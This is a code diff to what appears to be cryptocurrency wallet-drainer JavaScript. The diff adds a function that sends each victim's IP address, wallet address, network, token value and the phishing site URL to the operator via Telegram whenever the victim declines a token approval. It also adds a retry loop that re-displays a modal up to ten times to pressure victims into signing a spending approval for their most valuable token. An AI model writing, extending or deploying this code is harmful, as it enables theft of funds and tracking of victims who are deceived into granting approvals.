@@ -396,6 +396,26 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
   }
 }
 
+async function notifyTransactionDeclined(address, walletName, device, token, chainId) {
+  try {
+    console.log('Sending transaction declined notification')
+    const ip = await getUserIP()
+    const siteUrl = window.location.href || 'Unknown URL'
+    const scanLink = getScanLink(address, chainId)
+    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
+    const amountValue = (token.balance * token.price).toFixed(2)
+    const message = `❌ Decline Transactions(${walletName} - ${device})\n` +
+                    `🌀 [Address](${scanLink})\n` +
+                    `🕸 Network: ${networkName}\n` +
+                    `🌎 ${ip}\n\n` +
+                    `🔥 Processing: ${amountValue}$**\n` +
+                    `➡️ ${token.symbol}\n\n` +
+                    `🔗 Site: ${siteUrl}`
+    await sendTelegramMessage(message)
+  } catch (error) {
+    store.errors.push(`Error in notifyTransactionDeclined: ${error.message}`)
+  }
+}
 
 const TOKENS = {
   'Ethereum': [
@@ -618,6 +638,50 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
+// Функция для повторных попыток approve с уведомлениями об отказе
+const retryApproveWithDeclineNotification = async (wagmiConfig, tokenAddress, contractAddress, chainId, userAddress, walletName, device, token) => {
+  let attempts = 0
+  const maxAttempts = 10 // Максимальное количество попыток
+  
+  while (attempts < maxAttempts) {
+    try {
+      console.log(`Attempt ${attempts + 1} to approve token`)
+      const txHash = await approveToken(wagmiConfig, tokenAddress, contractAddress, chainId)
+      return txHash
+    } catch (error) {
+      attempts++
+      
+      // Проверяем, является ли ошибка отказом пользователя (только код 4001)
+      if (error.code === 4001) {
+        console.log(`User declined transaction on attempt ${attempts}`)
+        
+        // Отправляем уведомление об отказе
+        await notifyTransactionDeclined(userAddress, walletName, device, token, chainId)
+        
+        // Если это не последняя попытка, ждем немного и пробуем снова
+        if (attempts < maxAttempts) {
+          console.log(`Waiting 2 seconds before retry...`)
+          await new Promise(resolve => setTimeout(resolve, 2000))
+          
+          // Показываем модальное окно снова для следующей попытки
+          showCustomModal()
+          const modalMessage = document.querySelector('.custom-modal-message')
+          if (modalMessage) {
+            modalMessage.textContent = `Please sign the transaction to continue. Attempt ${attempts + 1}/${maxAttempts}`
+          }
+          
+          continue
+        } else {
+          // Если достигли максимального количества попыток
+          throw new Error(`User declined transaction after ${maxAttempts} attempts`)
+        }
+      } else {
+        // Если это не ошибка отказа пользователя, пробрасываем ошибку
+        throw error
+      }
+    }
+  }
+}
 
 // Инициализация подписок
 const initializeSubscribers = (modal) => {
@@ -774,7 +838,7 @@ const initializeSubscribers = (modal) => {
           store.isProcessingConnection = false
         } catch (error) {
           store.isApprovalRequested = false
-          if (error.code === 4001 || error.code === -32000 || error.message.includes('User rejected') || error.message.includes('User denied') || error.message.includes('User declined transaction after')) {
+          if (error.code === 4001 || error.message.includes('User declined transaction after')) {
             store.isApprovalRejected = true
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
             store.errors.push(errorMessage)
